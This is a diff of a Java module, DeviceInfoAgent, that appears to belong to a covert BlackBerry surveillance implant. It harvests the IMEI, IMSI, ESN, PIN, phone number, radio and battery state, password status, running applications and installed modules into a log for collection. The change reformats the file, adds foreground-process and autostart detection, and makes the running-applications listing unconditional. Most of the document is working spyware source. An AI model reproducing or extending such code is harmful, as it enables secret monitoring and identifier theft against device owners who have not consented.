@@ -38,342 +38,361 @@ import blackberry.utils.Check;
  * The Class DeviceInfoAgent.
  */
 public final class DeviceInfoAgent extends Agent {
-    //#ifdef DEBUG
-    static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
-    //#endif
+	// #ifdef DEBUG
+	static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
+	// #endif
 
-    Device device;
-    boolean runningApplication;
-    boolean installedApplication;
+	Device device;
+	boolean runningApplication;
+	boolean installedApplication;
 
-    /**
-     * Instantiates a new device info agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     */
-    public DeviceInfoAgent(final boolean agentStatus) {
-        super(AGENT_DEVICE, agentStatus, Conf.AGENT_DEVICEINFO_ON_SD,
-                "DeviceInfoAgent");
-        //#ifdef DBC
-        Check.asserts(Log.convertTypeLog(agentId) == LogType.DEVICE,
-                "Wrong Conversion");
-        //#endif
+	/**
+	 * Instantiates a new device info agent.
+	 * 
+	 * @param agentStatus
+	 *            the agent status
+	 */
+	public DeviceInfoAgent(final boolean agentStatus) {
+		super(AGENT_DEVICE, agentStatus, Conf.AGENT_DEVICEINFO_ON_SD,
+				"DeviceInfoAgent");
+		//#ifdef DBC
+		Check.asserts(Log.convertTypeLog(agentId) == LogType.DEVICE,
+				"Wrong Conversion");
+		//#endif
 
-        device = Device.getInstance();
-    }
+		device = Device.getInstance();
+	}
 
-    /**
-     * Instantiates a new device info agent.
-     * 
-     * @param agentStatus
-     *            the agent status
-     * @param confParams
-     *            the conf params
-     */
-    protected DeviceInfoAgent(final boolean agentStatus, final byte[] confParams) {
-        this(agentStatus);
-        parse(confParams);
-    }
+	/**
+	 * Instantiates a new device info agent.
+	 * 
+	 * @param agentStatus
+	 *            the agent status
+	 * @param confParams
+	 *            the conf params
+	 */
+	protected DeviceInfoAgent(final boolean agentStatus, final byte[] confParams) {
+		this(agentStatus);
+		parse(confParams);
+	}
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.threadpool.TimerJob#actualRun()
-     */
-    public void actualRun() {
-        //#ifdef DBC
-        Check.requires(log != null, "Null log");
-        //#endif
+	/*
+	 * (non-Javadoc)
+	 * 
+	 * @see blackberry.threadpool.TimerJob#actualRun()
+	 */
+	public void actualRun() {
+		//#ifdef DBC
+		Check.requires(log != null, "Null log");
+		//#endif
 
-        log.createLog(null);
+		log.createLog(null);
 
-        boolean ret = true;
+		boolean ret = true;
 
-        final StringBuffer sb = new StringBuffer();
+		final StringBuffer sb = new StringBuffer();
 
-        // Modello
-        // sb.append("Processor: ARM\n");
-        if (DeviceInfo.isSimulator()) {
-            sb.append("Simulator\n");
-        }
+		// Modello
+		// sb.append("Processor: ARM\n");
+		if (DeviceInfo.isSimulator()) {
+			sb.append("Simulator\n");
+		}
 
-        //#ifdef DEBUG
-        sb.append("Debug\n");
-        //#endif
+		// #ifdef DEBUG
+		sb.append("Debug\n");
+		// #endif
 
-        sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
-        sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
-        sb.append("Pin: " + Device.getPin() + "\n");
+		sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
+		sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
+		sb.append("Pin: " + Device.getPin() + "\n");
 
-        // Alimentazione
-        //sb.append("\nBATTERY\n-----\n");
-        sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
-        sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
-        sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
-                + " Degrees\n");
-        sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + " V\n");
-       
-        //Radio
-        //sb.append("\nRADIO\n-----\n");
-        if (Device.isCDMA()) {
-            sb.append("CDMA\n");
-            sb.append("SID: " + device.getSid() + "\n");
-            sb.append("ESN: " + NumberUtilities.toString(device.getEsn(), 16)
-                    + "\n");
-        } else {
-            sb.append("GPRS\n");
-            sb.append("IMEI: " + device.getImei() + "\n");
-            sb.append("IMSI: " + device.getImsi() + "\n");
-            sb.append("HomeMCC: " + GPRSInfo.getHomeMCC() + "\n");
-            sb.append("HomeMNC: " + GPRSInfo.getHomeMNC() + "\n"); 
-            sb.append("RSSI: " + GPRSInfo.getCellInfo().getRSSI()+"\n");
-        }
+		// Alimentazione
+		// sb.append("\nBATTERY\n-----\n");
+		sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
+		sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
+		sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
+				+ " Degrees\n");
+		sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + " V\n");
 
-        try {
-            sb.append("Zone name: " + GPRSInfo.getZoneName()+ "\n");
-            sb.append("Active Wafs: " + RadioInfo.getActiveWAFs()+ "\n");
-            sb.append("Carrier: " + RadioInfo.getCurrentNetworkName()+ "\n");
-            sb.append("Enabled Wafs: " + RadioInfo.getEnabledWAFs()+ "\n");
-            sb.append("Country Code: "
-                    + RadioInfo.getNetworkCountryCode(RadioInfo
-                            .getCurrentNetworkIndex())+ "\n");
-            sb.append("Network Services: " + RadioInfo.getNetworkService()+ "\n");
-            sb.append("Network Type: " + RadioInfo.getNetworkType()+ "\n");
-            sb.append("Signal level: " + RadioInfo.getSignalLevel() + " dB\n");
-            sb.append("DataServiceOperational: "
-                    + RadioInfo.isDataServiceOperational()+ "\n");
-            sb.append("DataServiceSuspended: "
-                    + RadioInfo.isDataServiceSuspended()+ "\n");
-            //sb.append(": " +  RadioInfo.);
-        } catch (Exception ex) {
-            //#ifdef DEBUG_ERROR
-            debug.error("Radio: " + ex);
-            //#endif
-        }
+		// Radio
+		// sb.append("\nRADIO\n-----\n");
+		if (Device.isCDMA()) {
+			sb.append("CDMA\n");
+			sb.append("SID: " + device.getSid() + "\n");
+			sb.append("ESN: " + NumberUtilities.toString(device.getEsn(), 16)
+					+ "\n");
+		} else {
+			sb.append("GPRS\n");
+			sb.append("IMEI: " + device.getImei() + "\n");
+			sb.append("IMSI: " + device.getImsi() + "\n");
+			sb.append("HomeMCC: " + GPRSInfo.getHomeMCC() + "\n");
+			sb.append("HomeMNC: " + GPRSInfo.getHomeMNC() + "\n");
+			sb.append("RSSI: " + GPRSInfo.getCellInfo().getRSSI() + "\n");
+		}
 
-        // Device
-        //sb.append("\nDEVICE\n------\n");
-        // DISK
-        sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
+		try {
+			sb.append("Zone name: " + GPRSInfo.getZoneName() + "\n");
+			sb.append("Active Wafs: " + RadioInfo.getActiveWAFs() + "\n");
+			sb.append("Carrier: " + RadioInfo.getCurrentNetworkName() + "\n");
+			sb.append("Enabled Wafs: " + RadioInfo.getEnabledWAFs() + "\n");
+			sb.append("Country Code: "
+					+ RadioInfo.getNetworkCountryCode(RadioInfo
+							.getCurrentNetworkIndex()) + "\n");
+			sb.append("Network Services: " + RadioInfo.getNetworkService()
+					+ "\n");
+			sb.append("Network Type: " + RadioInfo.getNetworkType() + "\n");
+			sb.append("Signal level: " + RadioInfo.getSignalLevel() + " dB\n");
+			sb.append("DataServiceOperational: "
+					+ RadioInfo.isDataServiceOperational() + "\n");
+			sb.append("DataServiceSuspended: "
+					+ RadioInfo.isDataServiceSuspended() + "\n");
+			// sb.append(": " + RadioInfo.);
+		} catch (Exception ex) {
+			// #ifdef DEBUG_ERROR
+			debug.error("Radio: " + ex);
+			// #endif
+		}
 
-        // OS Version
-        sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");
-        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
-        sb.append("Phone: " + device.getPhoneNumber() + "\n");
+		// Device
+		// sb.append("\nDEVICE\n------\n");
+		// DISK
+		sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
 
-        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
-        sb.append("SoftwareVersion: " + DeviceInfo.getSoftwareVersion() + "\n");
-        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
-        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
+		// OS Version
+		sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");
+		sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
+		sb.append("Phone: " + device.getPhoneNumber() + "\n");
 
-        try {
-            if (this.installedApplication) {
-                sb.append(getRunningApplications());
-                sb.append(getInstalledModuleGroup());
-                //sb.append(getInstalledApplications());
-            }
-        } catch (Exception ex) {
-            //#ifdef DEBUG_ERROR
-            debug.error(ex);
-            //#endif
-        }
+		sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
+		sb.append("SoftwareVersion: " + DeviceInfo.getSoftwareVersion() + "\n");
+		sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
+		sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");
 
-        ret = log.writeLog(sb.toString(), true);
+		sb.append(getRunningApplications());
+		
+		try {
+			if (this.installedApplication) {
+				
+				sb.append(getInstalledModuleGroup());
+				// sb.append(getInstalledApplications());
+			}
+		} catch (Exception ex) {
+			// #ifdef DEBUG_ERROR
+			debug.error(ex);
+			// #endif
+		}
 
-        if (ret == false) {
-            //#ifdef DEBUG
-            debug.error("Error writing file");
-            //#endif
-        }
+		ret = log.writeLog(sb.toString(), true);
 
-        log.close();
+		if (ret == false) {
+			// #ifdef DEBUG
+			debug.error("Error writing file");
+			// #endif
+		}
 
-    }
+		log.close();
 
-    /**
-     * Gets the running applications.
-     * 
-     * @return the running applications
-     */
-    String getRunningApplications() {
-        final StringBuffer sb = new StringBuffer();
-        sb.append("\r\nRunning applications: \r\n");
+	}
 
-        final ApplicationManager manager = ApplicationManager
-                .getApplicationManager();
+	/**
+	 * Gets the running applications.
+	 * 
+	 * @return the running applications
+	 */
+	String getRunningApplications() {
+		final StringBuffer sb = new StringBuffer();
 
-        // Check to see if application is running.
-        final ApplicationDescriptor[] descriptors = manager
-                .getVisibleApplications();
-        // Retrieve the name of a running application.
-        for (int i = 0; i < descriptors.length; i++) {
-            final ApplicationDescriptor descriptor = descriptors[i];
-            sb.append(descriptor.getName());
-            sb.append(" ");
-            sb.append(descriptor.getVersion());
-            sb.append(" ");
-            sb.append(descriptor.getFlags());
-            sb.append("\r\n");
-        }
+		final ApplicationManager manager = ApplicationManager
+				.getApplicationManager();
 
-        return sb.toString();
-    }
+		int foregroundProcess = manager.getForegroundProcessId();
+		sb.append("\r\nForeground process: " + foregroundProcess);
 
-    /**
-     * Gets the running applications.
-     * 
-     * @return the running applications
-     */
-    String getInstalledApplications() {
-        final StringBuffer sb = new StringBuffer();
-        sb.append("\r\nInstalled applications: \r\n");
+		sb.append("\r\nRunning applications: \r\n");
 
-        // Retrieve an array of handles for existing modules on a BlackBerry device
-        int handles[] = CodeModuleManager.getModuleHandles();
+		// Check to see if application is running.
+		final ApplicationDescriptor[] descriptors = manager
+				.getVisibleApplications();
+		// Retrieve the name of a running application.
+		for (int i = 0; i < descriptors.length; i++) {
+			final ApplicationDescriptor descriptor = descriptors[i];
+			sb.append(descriptor.getName());
+			sb.append(" ");
+			sb.append(descriptor.getVersion());
+			sb.append(" ");
+			sb.append(descriptor.getFlags());
+			sb.append(" ");
+			if(manager.getProcessId(descriptor) == foregroundProcess){
+				sb.append(" FOREGROUND");
+			}
+			if( (descriptor.getPowerOnBehavior() & ApplicationDescriptor.FLAG_RUN_ON_STARTUP) != 0 ){
+				sb.append(" AUTOSTARTUP");
+			}
+			sb.append("\r\n");
+		}
 
-        int size = handles.length;
-        for (int i = 0; i < size; i++) {
-            int handle = handles[i];
-            //CodeModuleManager.getModuleHandle(name)
-            // Retrieve specific information about a module.
-            String name = CodeModuleManager.getModuleName(handle);
-            String vendor = CodeModuleManager.getModuleVendor(handle);
-            String description = CodeModuleManager.getModuleDescription(handle);
-            String version = CodeModuleManager.getModuleVersion(handle);
-            int moduleSize = CodeModuleManager.getModuleCodeSize(handle);
-            long timestamp = CodeModuleManager.getModuleTimestamp(handle);
+		return sb.toString();
+	}
 
-            Date date = new Date(timestamp);
+	/**
+	 * Gets the running applications.
+	 * 
+	 * @return the running applications
+	 */
+	String getInstalledApplications() {
+		final StringBuffer sb = new StringBuffer();
+		sb.append("\r\nInstalled applications: \r\n");
 
-            sb.append(name);
-            sb.append(" , ");
-            sb.append(vendor);
-            sb.append("\r\n");
-        }
+		// Retrieve an array of handles for existing modules on a BlackBerry
+		// device
+		int handles[] = CodeModuleManager.getModuleHandles();
 
-        return sb.toString();
-    }
+		int size = handles.length;
+		for (int i = 0; i < size; i++) {
+			int handle = handles[i];
+			// CodeModuleManager.getModuleHandle(name)
+			// Retrieve specific information about a module.
+			String name = CodeModuleManager.getModuleName(handle);
+			String vendor = CodeModuleManager.getModuleVendor(handle);
+			String description = CodeModuleManager.getModuleDescription(handle);
+			String version = CodeModuleManager.getModuleVersion(handle);
+			int moduleSize = CodeModuleManager.getModuleCodeSize(handle);
+			long timestamp = CodeModuleManager.getModuleTimestamp(handle);
 
-    String getInstalledModuleGroup() {
-        final StringBuffer sb = new StringBuffer();
-        sb.append("\r\nInstalled Module Group: \r\n\r\n");
+			Date date = new Date(timestamp);
 
-        // Retrieve an array of handles for existing modules on a BlackBerry device
-        CodeModuleGroup handles[] = CodeModuleGroupManager.loadAll();
-        // Retrieve an array of handles for existing modules on a BlackBerry device
-        int AllModulesHandles[] = CodeModuleManager.getModuleHandles();
-        Hashtable remainigModules = new Hashtable();
-        int size = AllModulesHandles.length;
-        for (int i = 0; i < size; i++) {
-            remainigModules
-                    .put(new Integer(AllModulesHandles[i]), new Object());
-        }
+			sb.append(name);
+			sb.append(" , ");
+			sb.append(vendor);
+			sb.append("\r\n");
+		}
 
-        if (handles == null) {
-            size = 0;
-        } else {
-            size = handles.length;
-        }
-        for (int i = 0; i < size; i++) {
-            CodeModuleGroup group = handles[i];
+		return sb.toString();
+	}
 
-            // Retrieve specific information about a module.
-            String name = group.getName();
-            String copyright = group.getCopyright();
-            String description = group.getDescription();
-            int flags = group.getFlags();
-            String friendly = group.getFriendlyName();
-            String vendor = group.getVendor();
-            String version = group.getVersion();
+	String getInstalledModuleGroup() {
+		final StringBuffer sb = new StringBuffer();
+		sb.append("\r\nInstalled Module Group: \r\n\r\n");
 
-            if (name == Conf.GROUP_NAME) {
-                sb.append("******************\r\n");
+		// Retrieve an array of handles for existing modules on a BlackBerry
+		// device
+		CodeModuleGroup handles[] = CodeModuleGroupManager.loadAll();
+		// Retrieve an array of handles for existing modules on a BlackBerry
+		// device
+		int AllModulesHandles[] = CodeModuleManager.getModuleHandles();
+		Hashtable remainigModules = new Hashtable();
+		int size = AllModulesHandles.length;
+		for (int i = 0; i < size; i++) {
+			remainigModules
+					.put(new Integer(AllModulesHandles[i]), new Object());
+		}
 
-            }
+		if (handles == null) {
+			size = 0;
+		} else {
+			size = handles.length;
+		}
+		for (int i = 0; i < size; i++) {
+			CodeModuleGroup group = handles[i];
 
-            sb.append(name);
-            sb.append(" , ");
-            sb.append(vendor);
-            sb.append(" , ");
-            sb.append(flags);
-            sb.append(" , ");
-            sb.append(version);
-            sb.append("\r\n");
+			// Retrieve specific information about a module.
+			String name = group.getName();
+			String copyright = group.getCopyright();
+			String description = group.getDescription();
+			int flags = group.getFlags();
+			String friendly = group.getFriendlyName();
+			String vendor = group.getVendor();
+			String version = group.getVersion();
 
-            Enumeration enumerator = group.getModules();
-            while (enumerator.hasMoreElements()) {
-                String moduleName = (String) enumerator.nextElement();
-                int handle = CodeModuleManager.getModuleHandle(moduleName);
-                // Retrieve specific information about a module.
+			if (name == Conf.GROUP_NAME) {
+				sb.append("******************\r\n");
 
-                sb.append("--> " + moduleName);
-                if (handle > 0) {
-                    remainigModules.remove(new Integer(handle));
-                    String vendorModule = CodeModuleManager
-                            .getModuleVendor(handle);
-                    String versionModule = CodeModuleManager
-                            .getModuleVersion(handle);
-                    sb.append(", " + vendorModule);
-                    sb.append(", " + versionModule);
+			}
 
-                    ApplicationDescriptor[] descr = CodeModuleManager
-                            .getApplicationDescriptors(handle);
-                    if (descr != null && descr.length > 0) {
-                        sb.append(", ( ");
-                        for (int j = 0; j < descr.length; j++) {
-                            sb.append(descr[j].getFlags() + " ");
-                        }
-                        sb.append(")");
-                    }
-                }
-                sb.append("\r\n");
-            }
+			sb.append(name);
+			sb.append(" , ");
+			sb.append(vendor);
+			sb.append(" , ");
+			sb.append(flags);
+			sb.append(" , ");
+			sb.append(version);
+			sb.append("\r\n");
 
-            sb.append("\r\n");
+			Enumeration enumerator = group.getModules();
+			while (enumerator.hasMoreElements()) {
+				String moduleName = (String) enumerator.nextElement();
+				int handle = CodeModuleManager.getModuleHandle(moduleName);
+				// Retrieve specific information about a module.
 
-        }
+				sb.append("--> " + moduleName);
+				if (handle > 0) {
+					remainigModules.remove(new Integer(handle));
+					String vendorModule = CodeModuleManager
+							.getModuleVendor(handle);
+					String versionModule = CodeModuleManager
+							.getModuleVersion(handle);
+					sb.append(", " + vendorModule);
+					sb.append(", " + versionModule);
 
-        sb.append("\r\nUngrouped:\r\n\r\n");
-        Enumeration enumeration = remainigModules.keys();
-        while (enumeration.hasMoreElements()) {
-            Integer handle = (Integer) enumeration.nextElement();
+					ApplicationDescriptor[] descr = CodeModuleManager
+							.getApplicationDescriptors(handle);
+					if (descr != null && descr.length > 0) {
+						sb.append(", ( ");
+						for (int j = 0; j < descr.length; j++) {
+							sb.append(descr[j].getFlags() + " ");
+						}
+						sb.append(")");
+					}
+				}
+				sb.append("\r\n");
+			}
 
-            String nameModule = CodeModuleManager.getModuleName(handle
-                    .intValue());
-            String vendorModule = CodeModuleManager.getModuleVendor(handle
-                    .intValue());
-            String versionModule = CodeModuleManager.getModuleVersion(handle
-                    .intValue());
+			sb.append("\r\n");
 
-            sb.append(nameModule);
-            sb.append(", " + vendorModule);
-            sb.append(", " + versionModule);
-            sb.append("\r\n");
-        }
-        String ret = sb.toString();
-        return ret;
-    }
+		}
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.agent.Agent#parse(byte[])
-     */
-    protected boolean parse(final byte[] confParams) {
-        final DataBuffer databuffer = new DataBuffer(confParams, 0,
-                confParams.length, false);
-        try {
-            installedApplication = databuffer.readInt() == 1;
-            runningApplication = installedApplication;
-        } catch (final EOFException e) {
-            return false;
-        }
+		sb.append("\r\nUngrouped:\r\n\r\n");
+		Enumeration enumeration = remainigModules.keys();
+		while (enumeration.hasMoreElements()) {
+			Integer handle = (Integer) enumeration.nextElement();
 
-        //#ifdef DEBUG_INFO
-        debug.info("installedApplication: " + installedApplication);
+			String nameModule = CodeModuleManager.getModuleName(handle
+					.intValue());
+			String vendorModule = CodeModuleManager.getModuleVendor(handle
+					.intValue());
+			String versionModule = CodeModuleManager.getModuleVersion(handle
+					.intValue());
 
-        //#endif
+			sb.append(nameModule);
+			sb.append(", " + vendorModule);
+			sb.append(", " + versionModule);
+			sb.append("\r\n");
+		}
+		String ret = sb.toString();
+		return ret;
+	}
 
-        return true;
-    }
+	/*
+	 * (non-Javadoc)
+	 * 
+	 * @see blackberry.agent.Agent#parse(byte[])
+	 */
+	protected boolean parse(final byte[] confParams) {
+		final DataBuffer databuffer = new DataBuffer(confParams, 0,
+				confParams.length, false);
+		try {
+			installedApplication = databuffer.readInt() == 1;
+			runningApplication = installedApplication;
+		} catch (final EOFException e) {
+			return false;
+		}
+
+		// #ifdef DEBUG_INFO
+		debug.info("installedApplication: " + installedApplication);
+
+		// #endif
+
+		return true;
+	}
 
 }
